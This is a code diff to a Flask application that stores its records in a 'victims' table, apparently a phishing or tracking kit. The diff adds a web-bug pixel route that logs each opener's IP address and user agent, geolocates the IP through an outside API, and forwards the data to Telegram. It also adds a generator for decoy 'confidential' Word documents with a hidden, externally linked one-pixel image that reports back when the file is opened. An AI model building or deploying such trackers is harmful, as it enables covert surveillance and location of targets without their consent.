@@ -1,6 +1,7 @@
 import os
 import sqlite3
 import json
+import base64
 import requests
 from flask import Flask, render_template, request, jsonify, send_from_directory, Response, redirect
 from functools import wraps
@@ -325,6 +326,146 @@ def error_handler(tpl_name):
          conn.execute("UPDATE victims SET status=? WHERE ip=? AND template=? ORDER BY id DESC LIMIT 1",
                      (f"Error: {err_info['error']}", ip, tpl_name))
     return "OK"
+
+# =============== HONEYTOKEN PIXEL ROUTE ===============
+@app.route('/token/<token_id>.png')
+def honeytoken_pixel(token_id):
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
+    user_agent = request.headers.get("User-Agent", "Unknown")
+    
+    # Save hit to DB
+    tpl_name = f"📄 Doc_Piégé_{token_id}"
+    with sqlite3.connect(DB_FILE) as conn:
+        try:
+            conn.execute("INSERT INTO victims (template, ip, os, browser, status, battery, network, language, timezone, touch) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                         (tpl_name, ip, "HoneyToken", user_agent, 'Opened', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A'))
+        except sqlite3.OperationalError:
+            conn.execute("INSERT INTO victims (template, ip, os, browser, status) VALUES (?, ?, ?, ?, ?)",
+                         (tpl_name, ip, "HoneyToken", user_agent, 'Opened'))
+
+    # Build notify data
+    dev_info = {
+        'os': "DOCUMENT PIÉGÉ (WEB BUG)",
+        'platform': "N/A",
+        'browser': user_agent,
+        'cores': "N/A",
+        'ram': "N/A",
+        'vendor': "N/A",
+        'render': "N/A",
+        'ht': "N/A",
+        'wd': "N/A",
+        'lang': "N/A",
+        'tz': "N/A",
+        'net': "N/A",
+        'touch': "N/A",
+        'bat': "N/A",
+        'ip': ip
+    }
+    # We borrow the existing device_info telegram msg
+    send_tg(dev_info, 'device_info')
+    
+    # Try fetching IP geolocation via API
+    try:
+        req = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
+        if req.status_code == 200:
+            ip_data = req.json()
+            if ip_data.get('status') == 'success':
+                ip_info = {
+                    'continent': ip_data.get('timezone', '').split('/')[0],
+                    'country': ip_data.get('country', ''),
+                    'region': ip_data.get('regionName', ''),
+                    'city': ip_data.get('city', ''),
+                    'org': ip_data.get('org', ''),
+                    'isp': ip_data.get('isp', '')
+                }
+                send_tg(ip_info, 'ip_info')
+    except:
+        pass
+
+    # Return 1x1 transparent PNG
+    pixel = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=")
+    return Response(pixel, mimetype="image/png")
+
+import zipfile
+import io
+
+@app.route('/generate_docx/<token_id>')
+@requires_auth
+def generate_docx_honeytoken(token_id):
+    url = f"{request.url_root.replace('http://', 'https://')}token/{token_id}.png"
+    
+    rels = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
+</Relationships>"""
+
+    doc_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{url}" TargetMode="External"/>
+</Relationships>""".encode('utf-8')
+
+    content_types = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+    <Default Extension="xml" ContentType="application/xml"/>
+    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+</Types>"""
+
+    document = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
+            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+            xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
+            xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
+            xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
+    <w:body>
+        <w:p>
+            <w:r>
+                <w:t>CE DOCUMENT EST CONFIDENTIEL.</w:t>
+            </w:r>
+        </w:p>
+        <w:p>
+            <w:r>
+                <w:drawing>
+                    <wp:inline>
+                        <wp:extent cx="1" cy="1"/>
+                        <wp:docPr id="1" name="Picture 1"/>
+                        <a:graphic>
+                            <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
+                                <pic:pic>
+                                    <pic:nvPicPr>
+                                        <pic:cNvPr id="0" name="tracker.png"/>
+                                        <pic:cNvPicPr/>
+                                    </pic:nvPicPr>
+                                    <pic:blipFill>
+                                        <a:blip r:link="rId1"/>
+                                        <a:stretch><a:fillRect/></a:stretch>
+                                    </pic:blipFill>
+                                    <pic:spPr>
+                                        <a:xfrm><a:ext cx="1" cy="1"/></a:xfrm>
+                                        <a:prstGeom prst="rect"><a:avLst/></a:prstGeom>
+                                    </pic:spPr>
+                                </pic:pic>
+                            </a:graphicData>
+                        </a:graphic>
+                    </wp:inline>
+                </w:drawing>
+            </w:r>
+        </w:p>
+    </w:body>
+</w:document>"""
+
+    mem_zip = io.BytesIO()
+    with zipfile.ZipFile(mem_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("_rels/.rels", rels)
+        zf.writestr("word/_rels/document.xml.rels", doc_rels)
+        zf.writestr("word/document.xml", document)
+        zf.writestr("[Content_Types].xml", content_types)
+    
+    return Response(
+        mem_zip.getvalue(),
+        mimetype="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+        headers={"Content-Disposition": f"attachment;filename=Dossier_Confidentiel_{token_id}.docx"}
+    )
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
